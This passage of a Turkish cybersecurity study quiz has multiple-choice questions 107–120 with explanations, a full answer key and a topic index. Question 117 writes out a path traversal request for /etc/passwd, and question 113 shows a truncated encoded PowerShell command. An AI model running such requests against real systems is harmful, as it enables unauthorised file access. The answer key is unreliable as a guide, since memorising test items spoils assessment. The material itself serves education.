B) OSINT, Threat Intelligence'ın bir alt kümesidir; kamuya açık kaynaklardan bilgi toplamak Threat Intel üretiminin bir yöntemidir  
C) Threat Intelligence yalnızca Dark Web'den üretilir  
D) OSINT yalnızca saldırganlar tarafından kullanılır  

**Doğru Cevap: B**  
**Açıklama:** Threat Intelligence, rakipler ve tehditler hakkındaki analiz edilmiş bilgidir. OSINT ise bu bilgiyi kamuya açık kaynaklardan (web, sosyal medya, WHOIS, GitHub) toplama yöntemidir. Threat Intel OSINT dışında HUMINT, SIGINT gibi kaynaklardan da beslenir.

---

**108.** Aşağıdaki Kill Chain aşamalarına karşı en etkili savunma önlemlerini eşleştirin:

*Reconnaissance → Weaponization → Delivery → Exploitation*

A) Tümünü firewall önler  
B) Recon: Harici bilgi ifşasını azalt / Weaponization: Threat Intel ile araç tespiti / Delivery: E-posta filtresi, web proxy / Exploitation: Patch yönetimi, WAF  
C) Tümünü IDS önler  
D) Tümünü antivirus önler  

**Doğru Cevap: B**  
**Açıklama:** Defense in Depth, Kill Chain'in her aşamasında farklı kontroller gerektirir. Recon aşamasında dışarıya az bilgi sızdırmak, Delivery'de e-posta gateway ve proxy filtreleme, Exploitation'da güncel patch ve WAF kritik önlemlerdir.

---

**109.** Bir organizasyon hem SIEM hem SOAR kullanıyor. Aşağıdaki iş akışı nasıl çalışır?

A) SOAR logları toplar, SIEM otomatik yanıt verir  
B) SIEM çok sayıda kaynaktan log topar, korelasyon yaparak alarm üretir; SOAR bu alarmı alarak playbook aracılığıyla otomatik yanıt verir (IP engelleme, hesap kilitleme, ticket açma)  
C) İkisi bağımsız çalışır, birbirini etkilemez  
D) SIEM yalnızca network log'ları, SOAR yalnızca endpoint log'ları izler  

**Doğru Cevap: B**  
**Açıklama:** SIEM + SOAR entegrasyonu: SIEM "10 dakikada 5 farklı sunucuya lateral movement var" alarmını üretir → SOAR ilgili hesabı kilitler, saldırgan IP'yi firewall'da engeller ve ticket açar. SOC analisti olayı incelemeye başladığında ilk müdahale zaten yapılmıştır.

---

**110.** Aşağıdaki senaryoda "False Positive" oranının yüksek olmasının pratik sonuçları nelerdir?

*"IDS sistemi günde 10.000 alarm üretiyor; 9.950'si yanlış pozitif."*

A) Sistem daha güvenlidir  
B) SOC ekibi alarm yorgunluğuna (alert fatigue) girer; gerçek saldırılar gürültü içinde kaybolabilir ve yanıt süresi uzar  
C) False Positive güvenlik için iyidir  
D) Yalnızca bant genişliğini tüketir  

**Doğru Cevap: B**  
**Açıklama:** Alert Fatigue, yüksek False Positive oranının en tehlikeli sonucudur. Ekip çok fazla gereksiz alarma bakınca gerçek bir saldırı geldiğinde "yine False Positive olsa gerek" diyerek görmezden gelebilir. IDS kurallarının ince ayarı kritiktir.

---

**111.** Aşağıdaki senaryo OWASP Top 10'un hangi kategorisini örneklemektedir?
*"Kullanıcı `/account?id=123` URL'sini `/account?id=124` olarak değiştirerek başka birinin hesap bilgilerine erişiyor."*

A) Injection  
B) Cryptographic Failures  
C) Broken Access Control  
D) Security Misconfiguration  

**Doğru Cevap: C**  
**Açıklama:** Bu IDOR (Insecure Direct Object Reference) örneğidir; Broken Access Control kategorisindedir. Uygulama, isteği yapanın ID 124'e erişim yetkisi olup olmadığını kontrol etmiyor. Sunucu tarafında yetki doğrulaması zorunludur.

---

**112.** Aşağıdaki komut kombinasyonunu analiz edin:
```
dd if=/dev/sda bs=512 count=1 | md5sum
```
Bu komut ne yapar ve adli bilişimde amacı nedir?

A) Diskin tamamını kopyalar  
B) Diskin yalnızca ilk boot sektörünü (512 byte) okur ve MD5 hash'ini hesaplar; boot sektörü analizi ve değişiklik tespiti için kullanılır  
C) Diski formatlar  
D) RAM içeriğini kopyalar  

**Doğru Cevap: B**  
**Açıklama:** `bs=512 count=1` yalnızca ilk sektörü (MBR — Master Boot Record) okur. `md5sum` bu içeriğin hash değerini hesaplar. Boot record infector (zararlı yazılım) tespiti ve referans hash ile karşılaştırma için kullanılır.

---

**113.** "Obfuscation" kullanan bir malware örneği olan bu PowerShell komutunu analiz edin:
```
powershell -enc JABjAGwAaQBlAG4AdA...
```
Bu saldırı tekniği hakkında aşağıdakilerden hangisi doğrudur?

A) Bu normal bir sistem komutu  
B) Base64 encode edilmiş zararlı komut; obfuscation ile imza tabanlı tespit atlatılmaya çalışılıyor; bu fileless malware tekniğidir  
C) Bu bir backup komutu  
D) Bu DNS sorgusu  

**Doğru Cevap: B**  
**Açıklama:** `-enc` PowerShell'in Base64 encoded komut çalıştırma parametresidir. Zararlı komut Base64 ile encode edilerek antivirüs imza tespitinden kaçar. Diske yazılmadan bellekte çalıştığından fileless malware kategorisindedir.

---

**114.** Aşağıdaki Incident Response senaryosunu doğru sırayla çözün:
*"Çalışan, fidye notu içeren bir ekran gördü ve IT'yi aradı."*

Doğru eylem zinciri nedir?

A) Fidyeyi öde → sistemi aç  
B) Identification: olayı doğrula → Containment: etkilenen sistemi ağdan ayır → Eradication: kötü amaçlı yazılımı temizle ve infection vektörünü bul → Recovery: yedekten geri yükle → Lessons Learned: rapor yaz  
C) Antivirus tara → restart at  
D) Log dosyalarını sil → sistemi formatla  

**Doğru Cevap: B**  
**Açıklama:** Ransomware senaryosunda: önce olay doğrulanır, sonra sistem ağdan izole edilir (yayılmayı önlemek için), kötü amaçlı yazılım ve entry point temizlenir, yedekten geri yükleme yapılır. Fidye ödenmesi önerilmez; verinin geri geleceği garanti değildir.

---

**115.** Zero Trust mimarisi ile geleneksel perimeter güvenliği arasındaki en temel fark nedir?

A) Zero Trust daha ucuzdur  
B) Geleneksel modelde iç ağ güvenilir sayılır; Zero Trust'ta ise iç ağdaki varlıklar da dahil olmak üzere hiçbir şey önceden güvenilir sayılmaz, her erişim doğrulanır  
C) Zero Trust yalnızca cloud ortamlarda çalışır  
D) Geleneksel model VPN gerektirmez  

**Doğru Cevap: B**  
**Açıklama:** "Castle and Moat" (kale ve hendek) modelinde dışarısı tehlikeli, içerisi güvenlidir. Ancak bir saldırgan içeri girince her şeye erişebilir. Zero Trust "never trust, always verify" — iç ağdaki bir cihaz bile her erişimde kimliğini ve yetkisini kanıtlamalıdır.

---

**116.** Aşağıdaki senaryo hangi kombinasyon saldırısını göstermektedir?
*"Saldırgan, meşru bir domain'e çok benzeyen 'paypa1.com' domain'i satın alıyor. Bu siteye SSL sertifikası alıyor (kilit işareti görünüyor). Phishing e-postası gönderiyor."*

A) SQL Injection + XSS  
B) Typo Squatting + Phishing + Sertifika güveninin kötüye kullanılması  
C) DNS Poisoning + MitM  
D) Watering Hole + Drive-by  

**Doğru Cevap: B**  
**Açıklama:** Bu sofistike bir saldırı kombinasyonudur: Typo Squatting (benzer alan adı), Phishing (e-posta ile yönlendirme), ve SSL sertifikasının güven işareti olarak kullanılması. Kilit simgesi yalnızca şifreli bağlantıyı gösterir, sitenin meşruiyetini değil.

---

**117.** `curl` ile yapılan aşağıdaki istek ne amaçla kullanılır ve hangi güvenlik riskini test eder?
```
curl -k -X GET "https://target.com/files?path=../../etc/passwd"
```

A) Normal dosya indirme isteği  
B) `-k` sertifika doğrulamasını atlar; `path` parametresine `../` eklenerek Directory Traversal güvenlik açığı test edilir  
C) DNS sorgusu yapar  
D) Ağ gecikmesini ölçer  

**Doğru Cevap: B**  
**Açıklama:** `-k` (insecure) self-signed sertifikalarda bile bağlanmayı sağlar. `../../etc/passwd` path traversal denemesidir; sunucu giriş doğrulaması yapmıyorsa şifre dosyasını döndürebilir. Bu tür güvenlik testleri yalnızca izinli ortamlarda yapılmalıdır.

---

**118.** Aşağıdaki senaryo Diamond Model açısından analiz edildiğinde dört bileşen nedir?
*"APT28 grubu, ele geçirilmiş bir bulut sunucusunu C2 altyapısı olarak kullanarak Spear Phishing ile Avrupa'daki bir savunma firmasının sistemlerine sızdı."*

A) Phishing, Email, Target, Exploit  
B) Adversary: APT28, Infrastructure: Ele geçirilmiş bulut sunucusu, Capability: Spear Phishing + C2, Victim: Avrupa savunma firması  
C) Malware, Network, Server, User  
D) Reconnaissance, Weaponization, Delivery, Exploitation  

**Doğru Cevap: B**  
**Açıklama:** Diamond Model dört köşe: Adversary (APT28), Infrastructure (C2 için kullanılan bulut sunucusu), Capability (Spear Phishing tekniği ve C2 araçları), Victim (hedef savunma şirketi). Bu analiz saldırganın profilini ve altyapısını anlamaya yarar.

---

**119.** Kapsamlı bir güvenlik değerlendirmesi yapılıyor. Aşağıdaki araçları doğru kullanım amacıyla eşleştirin:

*nmap / Wireshark / FTK Imager / grep / SIEM*

A) nmap: log analizi, Wireshark: port tarama, FTK Imager: network izleme, grep: disk imaj, SIEM: paket analizi  
B) nmap: port/servis keşfi, Wireshark: paket yakalama ve analiz, FTK Imager: forensic disk imajı, grep: log içinde desen arama, SIEM: merkezi log korelasyon ve alarm  
C) Tümü aynı işlevi yapar  
D) nmap: şifreleme, Wireshark: firewall, FTK Imager: antivirus, grep: IDS, SIEM: VPN  

**Doğru Cevap: B**  
**Açıklama:** Her araç farklı katmanda çalışır: nmap ağ keşfi, Wireshark paket analizi, FTK Imager disk forensics, grep log filtreleme, SIEM ise tüm olay verilerini merkezi korelasyon için bir araya getirir. Profesyonel güvenlik çalışmalarında tümü birlikte kullanılır.

---

**120.** Son senaryoyu çözün:
*"Şirkette şunlar gözlemleniyor: (1) Bir çalışan Wi-Fi bağlantısı kesildi ve yeniden bağlandıktan sonra şirket VPN'i çalışmıyor. (2) Aynı anda başka bir konumdan aynı kullanıcı adıyla VPN erişimi var. (3) Şirket içi bir sunucuya anormal saatte giriş yapıldı ve büyük boyutlu dosyalar dışarı transfer edildi. (4) Log dosyaları bu süreçte silinmiş."*

Bu senaryoda kullanılan saldırı teknikleri zinciri ve doğru Incident Response yaklaşımı nedir?

A) Ransomware saldırısı; sistemi kapatmak gerekir  
B) Evil Twin + Session Hijacking → Credential Theft → Unauthorized Access → Data Exfiltration + Log Clipping; Containment: etkilenen hesabı kilitle ve ağ erişimini kes, Forensics: mevcut log'ları koru ve RAM dump al, tüm session token'ları geçersiz kıl, IOC'leri belgele  
C) DDoS saldırısı; bant genişliğini artır  
D) Script kıdie saldırısı; antivirus tara  

**Doğru Cevap: B**  
**Açıklama:** Saldırı zinciri: (1) Deauth Attack + Evil Twin ile Wi-Fi bağlantısı kesildi, (2) Ele geçirilen kimlik bilgileriyle VPN'e paralel bağlantı yapıldı (Session Hijacking / Credential Theft), (3) yetkisiz erişimle veri sızdırıldı (Exfiltration), (4) Log Clipping ile izler silindi. APT örüntüsü taşıyan bu saldırıda: Containment için hesap kilitlenmeli ve tüm session'lar sonlandırılmalı; sistemi kapatmak RAM'deki delilleri yok edebilir; forensic ekip log artıklarını, network kayıtlarını ve memdump'ı analiz etmelidir.

---

## CEVAP ANAHTARI

| Soru | Cevap | Soru | Cevap | Soru | Cevap |
|------|-------|------|-------|------|-------|
| 1    | C     | 41   | C     | 81   | B     |
| 2    | D     | 42   | B     | 82   | B     |
| 3    | B     | 43   | C     | 83   | B     |
| 4    | A     | 44   | B     | 84   | B     |
| 5    | D     | 45   | B     | 85   | D     |
| 6    | B     | 46   | B     | 86   | B     |
| 7    | B     | 47   | B     | 87   | B     |
| 8    | B     | 48   | C     | 88   | B     |
| 9    | B     | 49   | C     | 89   | B     |
| 10   | C     | 50   | B     | 90   | B     |
| 11   | B     | 51   | B     | 91   | B     |
| 12   | C     | 52   | B     | 92   | B     |
| 13   | B     | 53   | C     | 93   | B     |
| 14   | C     | 54   | B     | 94   | B     |
| 15   | B     | 55   | B     | 95   | B     |
| 16   | C     | 56   | C     | 96   | B     |
| 17   | B     | 57   | B     | 97   | B     |
| 18   | C     | 58   | C     | 98   | B     |
| 19   | B     | 59   | B     | 99   | B     |
| 20   | B     | 60   | B     | 100  | B     |
| 21   | B     | 61   | C     | 101  | B     |
| 22   | C     | 62   | B     | 102  | B     |
| 23   | C     | 63   | B     | 103  | B     |
| 24   | C     | 64   | D     | 104  | B     |
| 25   | B     | 65   | B     | 105  | B     |
| 26   | B     | 66   | B     | 106  | B     |
| 27   | B     | 67   | B     | 107  | B     |
| 28   | C     | 68   | B     | 108  | B     |
| 29   | B     | 69   | B     | 109  | B     |
| 30   | B     | 70   | B     | 110  | B     |
| 31   | B     | 71   | B     | 111  | C     |
| 32   | B     | 72   | C     | 112  | B     |
| 33   | C     | 73   | B     | 113  | B     |
| 34   | C     | 74   | B     | 114  | B     |
| 35   | B     | 75   | B     | 115  | B     |
| 36   | C     | 76   | B     | 116  | B     |
| 37   | B     | 77   | B     | 117  | B     |
| 38   | B     | 78   | B     | 118  | B     |
| 39   | B     | 79   | B     | 119  | B     |
| 40   | B     | 80   | B     | 120  | B     |

---

## KONU BAZLI ÇALIŞMA REHBERİ

**Networking & OSI:** 1, 2, 6, 83  
**DNS & Protokoller:** 11, 22, 23, 29, 49, 53  
**Troubleshooting Araçları:** 3, 14, 18, 27, 35, 45, 52, 84, 104  
**nmap & Port Tarama:** 33, 57, 91  
**Authentication:** 7, 15, 36, 37, 39, 65, 87  
**Cryptography:** 8, 38, 41, 47, 94  
**Güvenlik Araçları:** 9, 17, 25, 31  
**Saldırı Türleri:** 19, 40, 44, 46, 48, 56, 58, 60, 66, 70, 74, 76, 99, 116  
**Social Engineering:** 10, 21, 23, 26, 30, 32, 72, 101  
**Incident Response:** 43, 50, 80, 93, 114  
**Forensics & Araçlar:** 42, 73, 77, 100, 102, 112  
**Frameworks:** 61, 62, 63, 78, 79, 97, 107, 108, 118  
**Zor Senaryolar:** 81, 82, 85, 88, 96, 103, 109, 119, 120  

---

*Cyber Security Roadmap — Çalışma Soruları*  
*roadmap.sh/cyber-security temel alınarak hazırlanmıştır*  
*120 soru · Kolay / Orta / Zor seviye dağılımlı*
